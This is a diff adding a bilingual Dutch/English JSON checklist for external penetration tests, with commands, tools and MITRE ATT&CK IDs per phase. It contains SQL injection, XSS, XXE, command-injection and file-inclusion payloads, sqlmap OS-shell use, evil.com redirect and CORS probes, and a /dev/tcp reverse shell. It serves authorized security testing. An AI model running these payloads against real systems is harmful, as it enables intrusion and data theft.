@@ -1,0 +1,4305 @@
+{
+  "schema_version": "1.0",
+  "checklists": {
+    "extern": {
+      "title": "Externe pentest",
+      "en_title": "External Pentest",
+      "phases": [
+        {
+          "id": "ext_recon",
+          "title": "Reconnaissance",
+          "items": [
+            {
+              "id": "ext_recon_001",
+              "title": "DNS enumeratie",
+              "en_title": "DNS Enumeration",
+              "description": "Voer DNS enumeratie uit om subdomeinen, MX-, NS- en TXT-records te ontdekken.",
+              "en_description": "Perform DNS enumeration to discover subdomains, MX, NS and TXT records.",
+              "commands": [
+                "dig axfr DOMAIN @NAMESERVER",
+                "dnsrecon -d DOMAIN -t std",
+                "host -t any DOMAIN"
+              ],
+              "command_refs": [
+                "recon_dns"
+              ],
+              "finding_refs": [
+                "DNS Zone Transfer",
+                "Information Disclosure"
+              ],
+              "tools": [
+                "dig",
+                "dnsrecon",
+                "host"
+              ],
+              "mitre_attack": [
+                "T1590.002"
+              ]
+            },
+            {
+              "id": "ext_recon_002",
+              "title": "OSINT verzameling",
+              "en_title": "OSINT Gathering",
+              "description": "Verzamel publiek beschikbare informatie over het doelwit via OSINT-bronnen.",
+              "en_description": "Gather publicly available information about the target using OSINT sources.",
+              "commands": [
+                "theHarvester -d DOMAIN -b all",
+                "amass enum -passive -d DOMAIN"
+              ],
+              "command_refs": [
+                "recon_osint"
+              ],
+              "finding_refs": [
+                "Information Disclosure"
+              ],
+              "tools": [
+                "theHarvester",
+                "amass",
+                "recon-ng"
+              ],
+              "mitre_attack": [
+                "T1593",
+                "T1589"
+              ]
+            },
+            {
+              "id": "ext_recon_003",
+              "title": "Subdomein enumeratie",
+              "en_title": "Subdomain Enumeration",
+              "description": "Ontdek subdomeinen via brute-force en passieve bronnen.",
+              "en_description": "Discover subdomains through brute-force and passive sources.",
+              "commands": [
+                "subfinder -d DOMAIN -o subs.txt",
+                "amass enum -d DOMAIN -o amass.txt"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Information Disclosure"
+              ],
+              "tools": [
+                "subfinder",
+                "amass",
+                "knockpy"
+              ],
+              "mitre_attack": [
+                "T1590.002"
+              ]
+            },
+            {
+              "id": "ext_recon_004",
+              "title": "Poortscan",
+              "en_title": "Port Scanning",
+              "description": "Scan het doelwit op open poorten en identificeer actieve services.",
+              "en_description": "Scan the target for open ports and identify active services.",
+              "commands": [
+                "nmap -sS -p- -T4 -oA scan_full TARGET",
+                "nmap -sU --top-ports 100 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Unnecessary Open Ports"
+              ],
+              "tools": [
+                "nmap",
+                "masscan",
+                "rustscan"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "ext_recon_005",
+              "title": "Service/versie detectie",
+              "en_title": "Service/Version Detection",
+              "description": "Bepaal service-versies op open poorten voor kwetsbaarheidsanalyse.",
+              "en_description": "Determine service versions on open ports for vulnerability analysis.",
+              "commands": [
+                "nmap -sV -sC -p PORT TARGET",
+                "nmap -sV --version-intensity 5 -p PORT TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Outdated Software Version"
+              ],
+              "tools": [
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1046"
+              ]
+            },
+            {
+              "id": "ext_recon_006",
+              "title": "SSL/TLS analyse",
+              "en_title": "SSL/TLS Analysis",
+              "description": "Analyseer SSL/TLS-configuratie op zwakke ciphers en verouderde protocollen.",
+              "en_description": "Analyze SSL/TLS configuration for weak ciphers and outdated protocols.",
+              "commands": [
+                "testssl --full TARGET:443",
+                "sslscan TARGET",
+                "nmap --script ssl-enum-ciphers -p 443 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Weak SSL/TLS Configuration",
+                "Expired Certificate"
+              ],
+              "tools": [
+                "testssl",
+                "sslscan",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1557"
+              ]
+            },
+            {
+              "id": "ext_recon_007",
+              "title": "SMTP enumeratie",
+              "en_title": "SMTP Enumeration",
+              "description": "Enumereer SMTP-service voor gebruikers en open relay-configuratie.",
+              "en_description": "Enumerate SMTP service for users and open relay configuration.",
+              "commands": [
+                "nmap --script smtp-enum-users -p 25 TARGET",
+                "smtp-user-enum -M VRFY -U users.txt -t TARGET"
+              ],
+              "command_refs": [
+                "recon_smtp"
+              ],
+              "finding_refs": [
+                "SMTP Open Relay",
+                "SMTP User Enumeration"
+              ],
+              "tools": [
+                "nmap",
+                "smtp-user-enum"
+              ],
+              "mitre_attack": [
+                "T1589.002"
+              ]
+            },
+            {
+              "id": "ext_recon_008",
+              "title": "SNMP enumeratie",
+              "en_title": "SNMP Enumeration",
+              "description": "Enumereer SNMP-services met standaard community strings.",
+              "en_description": "Enumerate SNMP services with default community strings.",
+              "commands": [
+                "snmpwalk -v2c -c public TARGET",
+                "onesixtyone -c community.txt TARGET"
+              ],
+              "command_refs": [
+                "recon_snmp"
+              ],
+              "finding_refs": [
+                "SNMP Default Community String"
+              ],
+              "tools": [
+                "snmpwalk",
+                "onesixtyone"
+              ],
+              "mitre_attack": [
+                "T1602.001"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_webenum",
+          "title": "Web Enumeratie",
+          "items": [
+            {
+              "id": "ext_webenum_001",
+              "title": "Technologie fingerprinting",
+              "en_title": "Technology Fingerprinting",
+              "description": "Identificeer gebruikte webframeworks, CMS-systemen en server-technologie.",
+              "en_description": "Identify web frameworks, CMS systems and server technology in use.",
+              "commands": [
+                "whatweb TARGET",
+                "wappalyzer TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Information Disclosure"
+              ],
+              "tools": [
+                "whatweb",
+                "wappalyzer"
+              ],
+              "mitre_attack": [
+                "T1592.004"
+              ]
+            },
+            {
+              "id": "ext_webenum_002",
+              "title": "Directory brute forcing",
+              "en_title": "Directory Brute Forcing",
+              "description": "Ontdek verborgen bestanden en mappen via woordenlijst-gebaseerde scans.",
+              "en_description": "Discover hidden files and directories through wordlist-based scanning.",
+              "commands": [
+                "gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt",
+                "feroxbuster -u https://TARGET -w wordlist.txt"
+              ],
+              "command_refs": [
+                "web_recon_fuzz"
+              ],
+              "finding_refs": [
+                "Directory Listing",
+                "Sensitive File Exposure"
+              ],
+              "tools": [
+                "gobuster",
+                "feroxbuster",
+                "dirsearch"
+              ],
+              "mitre_attack": [
+                "T1083"
+              ]
+            },
+            {
+              "id": "ext_webenum_003",
+              "title": "Virtual host enumeratie",
+              "en_title": "Virtual Host Enumeration",
+              "description": "Ontdek virtual hosts op het doelwit-IP via Host-header manipulatie.",
+              "en_description": "Discover virtual hosts on the target IP via Host header manipulation.",
+              "commands": [
+                "gobuster vhost -u https://TARGET -w vhosts.txt",
+                "ffuf -w vhosts.txt -u https://TARGET -H 'Host: FUZZ.DOMAIN'"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Information Disclosure"
+              ],
+              "tools": [
+                "gobuster",
+                "ffuf"
+              ],
+              "mitre_attack": [
+                "T1595.002"
+              ]
+            },
+            {
+              "id": "ext_webenum_004",
+              "title": "WordPress scanning",
+              "en_title": "WordPress Scanning",
+              "description": "Scan WordPress-installaties op kwetsbare plugins, thema's en gebruikers.",
+              "en_description": "Scan WordPress installations for vulnerable plugins, themes and users.",
+              "commands": [
+                "wpscan --url https://TARGET --enumerate ap,at,u"
+              ],
+              "command_refs": [
+                "recon_wpscan"
+              ],
+              "finding_refs": [
+                "Outdated WordPress Plugin",
+                "WordPress User Enumeration"
+              ],
+              "tools": [
+                "wpscan"
+              ],
+              "mitre_attack": [
+                "T1595.002"
+              ]
+            },
+            {
+              "id": "ext_webenum_005",
+              "title": "API endpoint discovery",
+              "en_title": "API Endpoint Discovery",
+              "description": "Ontdek API-endpoints via Swagger/OpenAPI, fuzzing en JavaScript-analyse.",
+              "en_description": "Discover API endpoints via Swagger/OpenAPI, fuzzing and JavaScript analysis.",
+              "commands": [
+                "ffuf -u https://TARGET/api/FUZZ -w api-wordlist.txt",
+                "katana -u https://TARGET -jc"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "API Information Disclosure",
+                "Missing API Authentication"
+              ],
+              "tools": [
+                "ffuf",
+                "katana",
+                "kiterunner"
+              ],
+              "mitre_attack": [
+                "T1595.002"
+              ]
+            },
+            {
+              "id": "ext_webenum_006",
+              "title": "JavaScript analyse",
+              "en_title": "JavaScript Analysis",
+              "description": "Analyseer JavaScript-bestanden op API-sleutels, endpoints en gevoelige informatie.",
+              "en_description": "Analyze JavaScript files for API keys, endpoints and sensitive information.",
+              "commands": [
+                "katana -u https://TARGET -jc -d 3",
+                "linkfinder -i https://TARGET/main.js -o cli"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Hardcoded Credentials in JavaScript",
+                "Information Disclosure"
+              ],
+              "tools": [
+                "katana",
+                "linkfinder",
+                "jsluice"
+              ],
+              "mitre_attack": [
+                "T1552.001"
+              ]
+            },
+            {
+              "id": "ext_webenum_007",
+              "title": "Parameter discovery",
+              "en_title": "Parameter Discovery",
+              "description": "Ontdek verborgen parameters in webapplicaties via fuzzing.",
+              "en_description": "Discover hidden parameters in web applications through fuzzing.",
+              "commands": [
+                "arjun -u https://TARGET/page",
+                "paramspider -d DOMAIN"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Hidden Parameter Manipulation"
+              ],
+              "tools": [
+                "arjun",
+                "paramspider"
+              ],
+              "mitre_attack": [
+                "T1595.002"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_webapp",
+          "title": "Web Applicatie",
+          "items": [
+            {
+              "id": "ext_webapp_001",
+              "title": "SQL Injection (Union-based)",
+              "en_title": "SQL Injection (Union-based)",
+              "description": "Test op union-based SQL-injectie kwetsbaarheden in invoervelden en parameters.",
+              "en_description": "Test for union-based SQL injection vulnerabilities in input fields and parameters.",
+              "commands": [
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT username,password,NULL FROM users--"
+              ],
+              "command_refs": [
+                "web_sqli_union"
+              ],
+              "finding_refs": [
+                "SQL Injection"
+              ],
+              "tools": [
+                "burpsuite",
+                "sqlmap"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_002",
+              "title": "SQL Injection (Blind)",
+              "en_title": "SQL Injection (Blind)",
+              "description": "Test op blind SQL-injectie via boolean- en time-based technieken.",
+              "en_description": "Test for blind SQL injection using boolean and time-based techniques.",
+              "commands": [
+                "' AND 1=1--",
+                "' AND SLEEP(5)--",
+                "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"
+              ],
+              "command_refs": [
+                "web_sqli_blind"
+              ],
+              "finding_refs": [
+                "SQL Injection"
+              ],
+              "tools": [
+                "burpsuite",
+                "sqlmap"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_003",
+              "title": "SQL Injection (Error-based)",
+              "en_title": "SQL Injection (Error-based)",
+              "description": "Test op error-based SQL-injectie door database-foutmeldingen te veroorzaken.",
+              "en_description": "Test for error-based SQL injection by triggering database error messages.",
+              "commands": [
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+              ],
+              "command_refs": [
+                "web_sqli_error"
+              ],
+              "finding_refs": [
+                "SQL Injection"
+              ],
+              "tools": [
+                "burpsuite",
+                "sqlmap"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_004",
+              "title": "SQLMap automatisering",
+              "en_title": "SQLMap Automation",
+              "description": "Gebruik SQLMap voor geautomatiseerde detectie en exploitatie van SQL-injectie.",
+              "en_description": "Use SQLMap for automated SQL injection detection and exploitation.",
+              "commands": [
+                "sqlmap -u 'https://TARGET/page?id=1' --batch --dbs",
+                "sqlmap -r request.txt --batch --level 5 --risk 3"
+              ],
+              "command_refs": [
+                "web_sqli_sqlmap"
+              ],
+              "finding_refs": [
+                "SQL Injection"
+              ],
+              "tools": [
+                "sqlmap"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_005",
+              "title": "SQL Injection File R/W & RCE",
+              "en_title": "SQL Injection File Read/Write & RCE",
+              "description": "Test SQL-injectie voor bestandstoegang en remote code execution.",
+              "en_description": "Test SQL injection for file access and remote code execution.",
+              "commands": [
+                "sqlmap -u 'https://TARGET/page?id=1' --file-read=/etc/passwd",
+                "sqlmap -u 'https://TARGET/page?id=1' --os-shell"
+              ],
+              "command_refs": [
+                "web_sqli_file_rw",
+                "web_sqli_rce"
+              ],
+              "finding_refs": [
+                "SQL Injection",
+                "Remote Code Execution"
+              ],
+              "tools": [
+                "sqlmap"
+              ],
+              "mitre_attack": [
+                "T1190",
+                "T1059"
+              ]
+            },
+            {
+              "id": "ext_webapp_006",
+              "title": "Cross-Site Scripting (XSS)",
+              "en_title": "Cross-Site Scripting (XSS)",
+              "description": "Test op reflected, stored en DOM-based XSS-kwetsbaarheden.",
+              "en_description": "Test for reflected, stored and DOM-based XSS vulnerabilities.",
+              "commands": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "'\"><svg/onload=alert(1)>"
+              ],
+              "command_refs": [
+                "web_xss_payloads",
+                "web_xss_steal"
+              ],
+              "finding_refs": [
+                "Cross-Site Scripting"
+              ],
+              "tools": [
+                "burpsuite",
+                "dalfox"
+              ],
+              "mitre_attack": [
+                "T1189"
+              ]
+            },
+            {
+              "id": "ext_webapp_007",
+              "title": "XXE injectie",
+              "en_title": "XXE Injection",
+              "description": "Test op XML External Entity injectie voor data-exfiltratie en SSRF.",
+              "en_description": "Test for XML External Entity injection for data exfiltration and SSRF.",
+              "commands": [
+                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+              ],
+              "command_refs": [
+                "web_xxe_payloads"
+              ],
+              "finding_refs": [
+                "XXE Injection"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_008",
+              "title": "SSTI detectie en exploitatie",
+              "en_title": "SSTI Detection and Exploitation",
+              "description": "Test op Server-Side Template Injection in template engines.",
+              "en_description": "Test for Server-Side Template Injection in template engines.",
+              "commands": [
+                "{{7*7}}",
+                "${7*7}",
+                "<%= 7*7 %>",
+                "#{7*7}"
+              ],
+              "command_refs": [
+                "web_ssti_detect",
+                "web_ssti_jinja"
+              ],
+              "finding_refs": [
+                "Server-Side Template Injection"
+              ],
+              "tools": [
+                "tplmap",
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_009",
+              "title": "Server-Side Request Forgery (SSRF)",
+              "en_title": "Server-Side Request Forgery (SSRF)",
+              "description": "Test op SSRF-kwetsbaarheden voor interne netwerktoegang en cloud metadata.",
+              "en_description": "Test for SSRF vulnerabilities for internal network access and cloud metadata.",
+              "commands": [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://127.0.0.1:PORT/",
+                "gopher://127.0.0.1:PORT/_data"
+              ],
+              "command_refs": [
+                "web_ssrf_cloud",
+                "web_ssrf_protocols",
+                "web_ssrf_scan"
+              ],
+              "finding_refs": [
+                "Server-Side Request Forgery"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190",
+                "T1552.005"
+              ]
+            },
+            {
+              "id": "ext_webapp_010",
+              "title": "CSRF validatie",
+              "en_title": "CSRF Validation",
+              "description": "Test op Cross-Site Request Forgery door CSRF-tokens en SameSite-beleid te valideren.",
+              "en_description": "Test for Cross-Site Request Forgery by validating CSRF tokens and SameSite policy.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Cross-Site Request Forgery"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1189"
+              ]
+            },
+            {
+              "id": "ext_webapp_011",
+              "title": "IDOR testing",
+              "en_title": "IDOR Testing",
+              "description": "Test op Insecure Direct Object References door object-ID's te manipuleren.",
+              "en_description": "Test for Insecure Direct Object References by manipulating object IDs.",
+              "commands": [
+                "/api/user/1 -> /api/user/2",
+                "/document?id=100 -> /document?id=101"
+              ],
+              "command_refs": [
+                "web_idor"
+              ],
+              "finding_refs": [
+                "Insecure Direct Object Reference"
+              ],
+              "tools": [
+                "burpsuite",
+                "autorize"
+              ],
+              "mitre_attack": [
+                "T1078"
+              ]
+            },
+            {
+              "id": "ext_webapp_012",
+              "title": "Bestandsupload bypass",
+              "en_title": "File Upload Bypass",
+              "description": "Test bestandsupload-functionaliteit op bypass van bestandstype-restrictties.",
+              "en_description": "Test file upload functionality for file type restriction bypass.",
+              "commands": [
+                "shell.php.jpg",
+                "shell.pHp",
+                "shell.php%00.jpg",
+                "Content-Type: image/jpeg"
+              ],
+              "command_refs": [
+                "web_upload_bypass"
+              ],
+              "finding_refs": [
+                "Unrestricted File Upload"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_013",
+              "title": "Command Injection",
+              "en_title": "Command Injection",
+              "description": "Test op OS command injection in invoervelden die systeemcommando's aanroepen.",
+              "en_description": "Test for OS command injection in input fields that invoke system commands.",
+              "commands": [
+                "; id",
+                "| whoami",
+                "$(id)",
+                "`id`",
+                "|| cat /etc/passwd"
+              ],
+              "command_refs": [
+                "web_cmdi_operators",
+                "web_cmdi_bypass",
+                "web_cmdi_shells"
+              ],
+              "finding_refs": [
+                "OS Command Injection"
+              ],
+              "tools": [
+                "burpsuite",
+                "commix"
+              ],
+              "mitre_attack": [
+                "T1059"
+              ]
+            },
+            {
+              "id": "ext_webapp_014",
+              "title": "LFI / RFI",
+              "en_title": "LFI / RFI",
+              "description": "Test op Local/Remote File Inclusion via path traversal en log poisoning.",
+              "en_description": "Test for Local/Remote File Inclusion via path traversal and log poisoning.",
+              "commands": [
+                "....//....//....//etc/passwd",
+                "php://filter/convert.base64-encode/resource=index.php",
+                "/var/log/apache2/access.log"
+              ],
+              "command_refs": [
+                "web_lfi_traversal",
+                "web_lfi_logpoison"
+              ],
+              "finding_refs": [
+                "Local File Inclusion",
+                "Remote File Inclusion"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190",
+                "T1083"
+              ]
+            },
+            {
+              "id": "ext_webapp_015",
+              "title": "Deserialisatie",
+              "en_title": "Deserialization",
+              "description": "Test op insecure deserialisatie in Java- en .NET-applicaties.",
+              "en_description": "Test for insecure deserialization in Java and .NET applications.",
+              "commands": [
+                "ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c 'COMMAND'",
+                "java -jar ysoserial.jar CommonsCollections1 'COMMAND'"
+              ],
+              "command_refs": [
+                "web_deser_java",
+                "web_deser_dotnet"
+              ],
+              "finding_refs": [
+                "Insecure Deserialization"
+              ],
+              "tools": [
+                "ysoserial",
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_016",
+              "title": "CORS misconfiguratie",
+              "en_title": "CORS Misconfiguration",
+              "description": "Test op onjuiste CORS-configuratie die cross-origin data-diefstal mogelijk maakt.",
+              "en_description": "Test for improper CORS configuration allowing cross-origin data theft.",
+              "commands": [
+                "curl -H 'Origin: https://evil.com' -I https://TARGET/api/data"
+              ],
+              "command_refs": [
+                "web_cors_exploit"
+              ],
+              "finding_refs": [
+                "CORS Misconfiguration"
+              ],
+              "tools": [
+                "burpsuite",
+                "curl"
+              ],
+              "mitre_attack": [
+                "T1189"
+              ]
+            },
+            {
+              "id": "ext_webapp_017",
+              "title": "Authenticatie testen",
+              "en_title": "Authentication Testing",
+              "description": "Test authenticatiemechanismen op zwakheden zoals brute force, account lockout en wachtwoordbeleid.",
+              "en_description": "Test authentication mechanisms for weaknesses like brute force, account lockout and password policy.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Weak Authentication",
+                "Missing Account Lockout"
+              ],
+              "tools": [
+                "burpsuite",
+                "hydra"
+              ],
+              "mitre_attack": [
+                "T1110"
+              ]
+            },
+            {
+              "id": "ext_webapp_018",
+              "title": "Sessie management",
+              "en_title": "Session Management",
+              "description": "Test sessiebeheer op fixatie, voorspelbare tokens en ontbrekende flags.",
+              "en_description": "Test session management for fixation, predictable tokens and missing flags.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Session Fixation",
+                "Missing Secure Cookie Flag"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1539"
+              ]
+            },
+            {
+              "id": "ext_webapp_019",
+              "title": "Prototype pollution",
+              "en_title": "Prototype Pollution",
+              "description": "Test JavaScript-applicaties op prototype pollution kwetsbaarheden.",
+              "en_description": "Test JavaScript applications for prototype pollution vulnerabilities.",
+              "commands": [
+                "__proto__[isAdmin]=true",
+                "constructor.prototype.isAdmin=true"
+              ],
+              "command_refs": [
+                "web_prototype_pollution"
+              ],
+              "finding_refs": [
+                "Prototype Pollution"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_020",
+              "title": "Type juggling",
+              "en_title": "Type Juggling",
+              "description": "Test op type juggling kwetsbaarheden in PHP en andere zwak-getypeerde talen.",
+              "en_description": "Test for type juggling vulnerabilities in PHP and other loosely typed languages.",
+              "commands": [
+                "password[]=",
+                "0e123 == 0e456"
+              ],
+              "command_refs": [
+                "web_type_juggle"
+              ],
+              "finding_refs": [
+                "Authentication Bypass via Type Juggling"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_021",
+              "title": "Node.js injectie",
+              "en_title": "Node.js Injection",
+              "description": "Test Node.js-applicaties op server-side JavaScript injectie.",
+              "en_description": "Test Node.js applications for server-side JavaScript injection.",
+              "commands": [
+                "require('child_process').exec('id')"
+              ],
+              "command_refs": [
+                "web_nodejs_inject"
+              ],
+              "finding_refs": [
+                "Server-Side JavaScript Injection"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1059.007"
+              ]
+            },
+            {
+              "id": "ext_webapp_022",
+              "title": "HTTP Request Smuggling",
+              "en_title": "HTTP Request Smuggling",
+              "description": "Test op HTTP request smuggling via Content-Length/Transfer-Encoding conflicten.",
+              "en_description": "Test for HTTP request smuggling via Content-Length/Transfer-Encoding conflicts.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "HTTP Request Smuggling"
+              ],
+              "tools": [
+                "burpsuite",
+                "smuggler"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_webapp_023",
+              "title": "Open redirect",
+              "en_title": "Open Redirect",
+              "description": "Test op open redirect kwetsbaarheden in redirect-parameters.",
+              "en_description": "Test for open redirect vulnerabilities in redirect parameters.",
+              "commands": [
+                "?redirect=https://evil.com",
+                "?url=//evil.com",
+                "?next=/\\evil.com"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Open Redirect"
+              ],
+              "tools": [
+                "burpsuite"
+              ],
+              "mitre_attack": [
+                "T1189"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_services",
+          "title": "Netwerk Services",
+          "items": [
+            {
+              "id": "ext_services_001",
+              "title": "FTP analyse",
+              "en_title": "FTP Analysis",
+              "description": "Test FTP-service op anonieme toegang, schrijfrechten en kwetsbaarheden.",
+              "en_description": "Test FTP service for anonymous access, write permissions and vulnerabilities.",
+              "commands": [
+                "ftp TARGET",
+                "nmap --script ftp-anon,ftp-bounce -p 21 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "FTP Anonymous Access",
+                "FTP Writable Directory"
+              ],
+              "tools": [
+                "nmap",
+                "ftp"
+              ],
+              "mitre_attack": [
+                "T1078.001"
+              ]
+            },
+            {
+              "id": "ext_services_002",
+              "title": "SSH audit",
+              "en_title": "SSH Audit",
+              "description": "Controleer SSH-configuratie op zwakke ciphers, sleutels en authenticatie-instellingen.",
+              "en_description": "Check SSH configuration for weak ciphers, keys and authentication settings.",
+              "commands": [
+                "ssh-audit TARGET",
+                "nmap --script ssh2-enum-algos -p 22 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Weak SSH Configuration",
+                "SSH Root Login Enabled"
+              ],
+              "tools": [
+                "ssh-audit",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1021.004"
+              ]
+            },
+            {
+              "id": "ext_services_003",
+              "title": "SMB enumeratie",
+              "en_title": "SMB Enumeration",
+              "description": "Enumereer SMB-shares, gebruikers en beleid via null-sessies.",
+              "en_description": "Enumerate SMB shares, users and policies via null sessions.",
+              "commands": [
+                "smbclient -L //TARGET -N",
+                "enum4linux -a TARGET",
+                "crackmapexec smb TARGET --shares"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "SMB Null Session",
+                "SMB Signing Not Required"
+              ],
+              "tools": [
+                "smbclient",
+                "enum4linux",
+                "crackmapexec"
+              ],
+              "mitre_attack": [
+                "T1021.002"
+              ]
+            },
+            {
+              "id": "ext_services_004",
+              "title": "NFS shares",
+              "en_title": "NFS Shares",
+              "description": "Enumereer NFS-exports en test op onbeveiligde toegang.",
+              "en_description": "Enumerate NFS exports and test for insecure access.",
+              "commands": [
+                "showmount -e TARGET",
+                "mount -t nfs TARGET:/share /mnt"
+              ],
+              "command_refs": [
+                "recon_nfs"
+              ],
+              "finding_refs": [
+                "NFS Unrestricted Access"
+              ],
+              "tools": [
+                "showmount",
+                "nmap"
+              ],
+              "mitre_attack": [
+                "T1135"
+              ]
+            },
+            {
+              "id": "ext_services_005",
+              "title": "RDP assessment",
+              "en_title": "RDP Assessment",
+              "description": "Test RDP-service op NLA, BlueKeep en andere kwetsbaarheden.",
+              "en_description": "Test RDP service for NLA, BlueKeep and other vulnerabilities.",
+              "commands": [
+                "nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "RDP NLA Not Enforced",
+                "RDP Vulnerability"
+              ],
+              "tools": [
+                "nmap",
+                "rdp-sec-check"
+              ],
+              "mitre_attack": [
+                "T1021.001"
+              ]
+            },
+            {
+              "id": "ext_services_006",
+              "title": "Database services",
+              "en_title": "Database Services",
+              "description": "Test database-services (MySQL, MSSQL, PostgreSQL) op standaard credentials en misconfiguratie.",
+              "en_description": "Test database services (MySQL, MSSQL, PostgreSQL) for default credentials and misconfiguration.",
+              "commands": [
+                "nmap --script mysql-info,mysql-enum -p 3306 TARGET",
+                "nmap --script ms-sql-info -p 1433 TARGET"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Database Default Credentials",
+                "Database Exposed to Internet"
+              ],
+              "tools": [
+                "nmap",
+                "hydra"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_services_007",
+              "title": "SNMP community strings",
+              "en_title": "SNMP Community Strings",
+              "description": "Brute-force SNMP community strings voor informatieverzameling.",
+              "en_description": "Brute-force SNMP community strings for information gathering.",
+              "commands": [
+                "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET",
+                "snmpwalk -v2c -c public TARGET 1.3.6.1.2.1"
+              ],
+              "command_refs": [
+                "recon_snmp"
+              ],
+              "finding_refs": [
+                "SNMP Default Community String"
+              ],
+              "tools": [
+                "onesixtyone",
+                "snmpwalk"
+              ],
+              "mitre_attack": [
+                "T1602.001"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ext_access",
+          "title": "Initieel Toegang",
+          "items": [
+            {
+              "id": "ext_access_001",
+              "title": "Exploit validatie",
+              "en_title": "Exploit Validation",
+              "description": "Valideer gevonden kwetsbaarheden met proof-of-concept exploits.",
+              "en_description": "Validate discovered vulnerabilities with proof-of-concept exploits.",
+              "commands": [
+                "searchsploit SERVICE VERSION",
+                "msfconsole -q -x 'use exploit/MODULE; set RHOSTS TARGET; check'"
+              ],
+              "command_refs": [],
+              "finding_refs": [
+                "Remote Code Execution"
+              ],
+              "tools": [
+                "searchsploit",
+                "metasploit"
+              ],
+              "mitre_attack": [
+                "T1190"
+              ]
+            },
+            {
+              "id": "ext_access_002",
+              "title": "Web shell deployment",
+              "en_title": "Web Shell Deployment",
+              "description": "Deploy een webshell na succesvolle upload- of injectie-kwetsbaarheid.",
+              "en_description": "Deploy a web shell after successful upload or injection vulnerability.",
+              "commands": [],
+              "command_refs": [],
+              "finding_refs": [
+                "Unrestricted File Upload",
+                "Remote Code Execution"
+              ],
+              "tools": [
+                "burpsuite",
+                "weevely"
+              ],
+              "mitre_attack": [
+                "T1505.003"
+              ]
+            },
+            {
+              "id": "ext_access_003",
+              "title": "Reverse shell",
+              "en_title": "Reverse Shell",
+              "description": "Verkrijg een reverse shell via verschillende methoden en protocollen.",
+              "en_description": "Obtain a reverse shell through various methods and protocols.",
+              "commands": [
+                "bash -i >& /dev/tcp/IP/PORT 0>&1",
+                "powercat -c IP -p PORT -e cmd"
+              ],
+              "command_refs": [
+                "shell_powercat",
+                "shell_socat"
+              ],
+              "finding_refs": [
+                "Remote Code Execution"
+              ],
+              "tools": [
+                "netcat",
+                "powercat",
+                "socat"
+              ],
+              "mitre_attack": [
+                "T1059",
+                "T1071.001"
+              ]
+            },
+            {
+              "id": "ext_access_004",
